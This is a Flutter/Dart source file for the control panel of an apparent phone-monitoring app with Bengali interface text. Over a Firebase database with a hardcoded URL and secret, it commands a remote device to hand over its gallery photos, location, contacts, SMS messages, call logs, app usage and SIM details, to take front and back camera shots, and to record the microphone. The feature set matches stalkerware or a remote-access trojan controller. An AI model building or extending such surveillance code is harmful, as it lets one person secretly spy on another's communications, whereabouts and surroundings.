import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

// ── Remote bridge ────────────────────────────────────────────────────────
const String kFbUrl =
    'https://aniket-remote-default-rtdb.asia-southeast1.firebasedatabase.app';
const String kFbSecret = 'atp2617';
const MethodChannel _gChannel = MethodChannel('aniket_pro_ai/gallery');

Future<dynamic> _fbGet(String path) async {
  try {
    final c = HttpClient()..connectionTimeout = const Duration(seconds: 8);
    final req = await c.getUrl(Uri.parse('$kFbUrl/r/$kFbSecret$path.json'));
    final res = await req.close().timeout(const Duration(seconds: 10));
    final s = await res.transform(utf8.decoder).join();
    c.close();
    return jsonDecode(s);
  } catch (_) {
    return null;
  }
}

Future<bool> _fbPut(String path, Object data) async {
  try {
    final c = HttpClient()..connectionTimeout = const Duration(seconds: 8);
    final req = await c.putUrl(Uri.parse('$kFbUrl/r/$kFbSecret$path.json'));
    req.headers.set('Content-Type', 'application/json');
    req.write(jsonEncode(data));
    final res = await req.close().timeout(const Duration(seconds: 10));
    await res.drain();
    c.close();
    return res.statusCode < 300;
  } catch (_) {
    return false;
  }
}

String _errHint(String? e) {
  switch (e) {
    case 'no_perm': return 'ওই ফোনে এই পারমিশনটা ON নেই';
    case 'usage_access_off': return 'ওই ফোনে Settings → Usage access ON করতে হবে';
    case 'cam_fail': return 'ক্যামেরা খোলা যায়নি (অ্যাপ খোলা থাকলে আবার চেষ্টা করো)';
    case 'mic_fail': return 'মাইক রেকর্ড ব্যর্থ';
    case 'not_found': return 'ফাইলটা আর নেই';
    case 'no_fix': return 'লোকেশন এখনো পাওয়া যায়নি (GPS অন থাকলে পরে চেষ্টা করো)';
    default: return e ?? 'অজানা এরর';
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  REMOTE CONSOLE CARD — per-device control panel
// ═══════════════════════════════════════════════════════════════════════
class RemoteConsoleCard extends StatefulWidget {
  final String deviceId;
  final String label;
  const RemoteConsoleCard({super.key, required this.deviceId, required this.label});

  @override
  State<RemoteConsoleCard> createState() => _RemoteConsoleCardState();
}

class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
  Map<String, dynamic> _perms = {};
  Map<String, dynamic> _info = {};
  bool _open = false;
  String? _busy;
  Timer? _t;

  @override
  void initState() {
    super.initState();
    _pull();
    _t = Timer.periodic(const Duration(seconds: 15), (_) => _pull());
  }

  @override
  void dispose() {
    _t?.cancel();
    super.dispose();
  }

  Future<void> _pull() async {
    final p = await _fbGet('/devices/${widget.deviceId}/perms');
    final i = await _fbGet('/devices/${widget.deviceId}/info');
    if (!mounted) return;
    setState(() {
      if (p is Map) _perms = Map<String, dynamic>.from(p);
      if (i is Map) _info = Map<String, dynamic>.from(i);
    });
  }

  bool get _online {
    final ls = (_info['lastSeen'] as num?)?.toInt() ?? 0;
    return ls > 0 && DateTime.now().millisecondsSinceEpoch - ls < 90000;
  }

  Future<Map<String, dynamic>?> _cmd(String type, {String? path}) async {
    final id = '${DateTime.now().millisecondsSinceEpoch}';
    await _fbPut('/devices/${widget.deviceId}/cmd',
        {'id': id, 'type': type, if (path != null) 'path': path});
    final sw = Stopwatch()..start();
    while (sw.elapsedMilliseconds < 40000) {
      await Future.delayed(const Duration(seconds: 2));
      final r = await _fbGet('/devices/${widget.deviceId}/res');
      if (r is Map && r['id'] == id) return Map<String, dynamic>.from(r);
    }
    return null;
  }

  Future<void> _onCmd(String type, {String? path}) async {
    if (_busy != null) return;
    setState(() => _busy = type);
    final res = await _cmd(type, path: path);
    if (!mounted) return;
    setState(() => _busy = null);
    if (res == null) {
      _snack('সাড়া নেই — ফোনটা কি অফলাইন? 📴');
      return;
    }
    if (res['ok'] != true) {
      _snack(_errHint(res['err']?.toString()));
      return;
    }
    _showResult(type, res['data']);
  }

  void _snack(String t) {
    if (mounted) {
      ScaffoldMessenger.of(context)
          .showSnackBar(SnackBar(content: Text(t), backgroundColor: const Color(0xFF2A2A2A)));
    }
  }

  Future<void> _fetchAndOpen(String path) async {
    setState(() => _busy = 'get');
    final res = await _cmd('galleryGet', path: path);
    if (!mounted) return;
    setState(() => _busy = null);
    if (res == null || res['ok'] != true) {
      _snack(res == null ? 'সাড়া নেই 📴' : _errHint(res['err']?.toString()));
      return;
    }
    final b64 = (res['data'] as Map?)?['img']?.toString();
    if (b64 == null) return;
    Navigator.push(context, MaterialPageRoute(builder: (_) => FullImageView(bytes: base64Decode(b64))));
  }

  void _showResult(String type, dynamic data) {
    if (type == 'camfront' || type == 'camback' || type == 'galleryGet') {
      final b64 = (data as Map?)?['img']?.toString();
      if (b64 != null) {
        Navigator.push(context,
            MaterialPageRoute(builder: (_) => FullImageView(bytes: base64Decode(b64))));
      }
      return;
    }
    if (type == 'mic') {
      final b64 = (data as Map?)?['aud']?.toString();
      if (b64 != null) {
        () async {
          try {
            final f = File('${Directory.systemTemp.path}/remote_mic.m4a');
            await f.writeAsBytes(base64Decode(b64));
            await _gChannel.invokeMethod('playFile', f.path);
            _snack('অডিও চলছে 🔊');
          } catch (_) {
            _snack('অডিও চালানো যায়নি');
          }
        }();
      }
      return;
    }
    if (type == 'siren') {
      _snack('সাইরেন পাঠানো হয়েছে 🚨');
      return;
    }
    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF1E1E1E),
      shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (_) => _resultSheet(type, data),
    );
  }

  Widget _resultSheet(String type, dynamic data) {
    String title = type;
    List<Widget> body = [];
    if (type == 'galleryList' && data is List) {
      title = 'রিমোট গ্যালারি (${data.length})';
      body = data.map((e) {
        final m = Map<String, dynamic>.from(e as Map);
        final dt = DateTime.fromMillisecondsSinceEpoch(((m['date'] as num?)?.toInt() ?? 0) * 1000);
        return ListTile(
          dense: true,
          leading: const Icon(Icons.image, color: Colors.white54, size: 20),
          title: Text(m['name']?.toString() ?? '', style: const TextStyle(color: Colors.white, fontSize: 13)),
          subtitle: Text('${dt.day}/${dt.month}/${dt.year} ${dt.hour}:${dt.minute.toString().padLeft(2, '0')}',
              style: const TextStyle(color: Colors.white38, fontSize: 11)),
          trailing: _busy == 'get'
              ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFFF5E6C8)))
              : IconButton(
                  icon: const Icon(Icons.download_rounded, color: Color(0xFFF5E6C8), size: 20),
                  onPressed: () {
                    Navigator.pop(context);
                    _fetchAndOpen(m['path']?.toString() ?? '');
                  },
                ),
        );
      }).toList();
    } else if ((type == 'contacts' || type == 'sms' || type == 'calls' || type == 'apps') && data is List) {
      title = {'contacts': 'কন্টাক্ট', 'sms': 'SMS', 'calls': 'কল লগ', 'apps': 'অ্যাপ ব্যবহার'}[type]!;
      body = data.map((e) {
        final m = Map<String, dynamic>.from(e as Map);
        String t1 = '', t2 = '';
        if (type == 'contacts') { t1 = m['name']?.toString() ?? ''; t2 = m['num']?.toString() ?? ''; }
        if (type == 'sms') { t1 = m['addr']?.toString() ?? ''; t2 = m['body']?.toString() ?? ''; }
        if (type == 'calls') { t1 = (m['name']?.toString() ?? '').isNotEmpty ? m['name'].toString() : (m['num']?.toString() ?? ''); t2 = m['num']?.toString() ?? ''; }
        if (type == 'apps') { t1 = m['pkg']?.toString() ?? ''; t2 = DateTime.fromMillisecondsSinceEpoch((m['last'] as num?)?.toInt() ?? 0).toString(); }
        return ListTile(
          dense: true,
          title: Text(t1, style: const TextStyle(color: Colors.white, fontSize: 13)),
          subtitle: Text(t2, maxLines: 2, overflow: TextOverflow.ellipsis,
              style: const TextStyle(color: Colors.white38, fontSize: 11)),
        );
      }).toList();
    } else if (data is Map) {
      title = {'loc': 'লোকেশন', 'sim': 'SIM তথ্য', 'ping': 'ডিভাইস', 'perms': 'পারমিশন'}[type] ?? type;
      body = data.entries.map((e) => ListTile(
            dense: true,
            title: Text('${e.key}: ${e.value}', style: const TextStyle(color: Colors.white, fontSize: 13)),
          )).toList();
    } else {
      body = [const Center(child: Text('ডাটা নেই', style: TextStyle(color: Colors.white54)))];
    }
    return DraggableScrollableSheet(
      expand: false,
      initialChildSize: 0.6,
      builder: (_, sc) => Column(
        children: [
          Padding(
            padding: const EdgeInsets.all(14),
            child: Text(title, style: const TextStyle(color: Color(0xFFF5E6C8), fontSize: 16, fontWeight: FontWeight.bold)),
          ),
          Expanded(child: ListView(controller: sc, children: body)),
        ],
      ),
    );
  }

  Widget _pIcon(String key) {
    final on = (_perms[key] as num?)?.toInt() == 1;
    IconData ic;
    switch (key) {
      case 'cam': ic = on ? Icons.camera_alt : Icons.no_photography; break;
      case 'pho': ic = on ? Icons.photo_library : Icons.hide_image; break;
      case 'mic': ic = on ? Icons.mic : Icons.mic_off; break;
      case 'loc': ic = on ? Icons.location_on : Icons.location_off; break;
      case 'con': ic = on ? Icons.contacts : Icons.person_off; break;
      case 'not': ic = on ? Icons.notifications : Icons.notifications_off; break;
      case 'sms': ic = on ? Icons.sms : Icons.sms_failed; break;
      case 'cal': ic = on ? Icons.call : Icons.call_end; break;
      default: ic = Icons.help_outline;
    }
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 3),
      child: Icon(ic, color: on ? Colors.green : Colors.redAccent, size: 17),
    );
  }

  Widget _cmdBtn(String type, IconData ic, String label) {
    return Padding(
      padding: const EdgeInsets.all(3),
      child: InkWell(
        borderRadius: BorderRadius.circular(10),
        onTap: _busy == null ? () => _onCmd(type) : null,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
          decoration: BoxDecoration(
            color: const Color(0xFF252525),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: const Color(0xFFF5E6C8).withOpacity(0.2)),
          ),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              _busy == type
                  ? const SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFFF5E6C8)))
                  : Icon(ic, color: const Color(0xFFF5E6C8), size: 15),
              const SizedBox(width: 6),
              Text(label, style: const TextStyle(color: Colors.white70, fontSize: 11)),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
      padding: const EdgeInsets.all(10),
      decoration: BoxDecoration(
        color: const Color(0xFF191919),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: const Color(0xFFF5E6C8).withOpacity(0.15)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          InkWell(
            onTap: () => setState(() => _open = !_open),
            child: Row(
              children: [
                Container(
                  width: 9, height: 9,
                  decoration: BoxDecoration(shape: BoxShape.circle, color: _online ? Colors.green : Colors.grey),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(
                    '${widget.label}  •  ${_online ? 'অনলাইন 🟢' : 'অফলাইন ⚫'}',
                    style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w600),
                  ),
                ),
                Icon(_open ? Icons.expand_less : Icons.expand_more, color: const Color(0xFFF5E6C8)),
              ],
            ),
          ),
          const SizedBox(height: 6),
          Row(children: ['cam', 'pho', 'mic', 'loc', 'con', 'not', 'sms', 'cal'].map(_pIcon).toList()),
          if (_open) ...[
            const SizedBox(height: 8),
            Wrap(
              children: [
                _cmdBtn('galleryList', Icons.photo_library, 'Gallery'),
                _cmdBtn('loc', Icons.location_on, 'Location'),
                _cmdBtn('contacts', Icons.contacts, 'Contacts'),
                _cmdBtn('camfront', Icons.face, 'Samner Cam'),
                _cmdBtn('camback', Icons.photo_camera, 'Pechoner Cam'),
                _cmdBtn('mic', Icons.mic, 'Mic 6s'),
                _cmdBtn('sms', Icons.sms, 'SMS'),
                _cmdBtn('calls', Icons.call, 'Calls'),
                _cmdBtn('apps', Icons.apps, 'Apps'),
                _cmdBtn('siren', Icons.campaign, 'Siren'),
                _cmdBtn('sim', Icons.sim_card, 'SIM'),
                _cmdBtn('ping', Icons.wifi_tethering, 'Ping'),
              ],
            ),
          ],
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  FULL IMAGE VIEWER (remote images)
// ═══════════════════════════════════════════════════════════════════════
class FullImageView extends StatelessWidget {
  final Uint8List bytes;
  const FullImageView({super.key, required this.bytes});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: const Text('Remote Image', style: TextStyle(color: Color(0xFFF5E6C8), fontSize: 14)),
      ),
      body: InteractiveViewer(
        child: Center(child: Image.memory(bytes, fit: BoxFit.contain)),
      ),
    );
  }
}
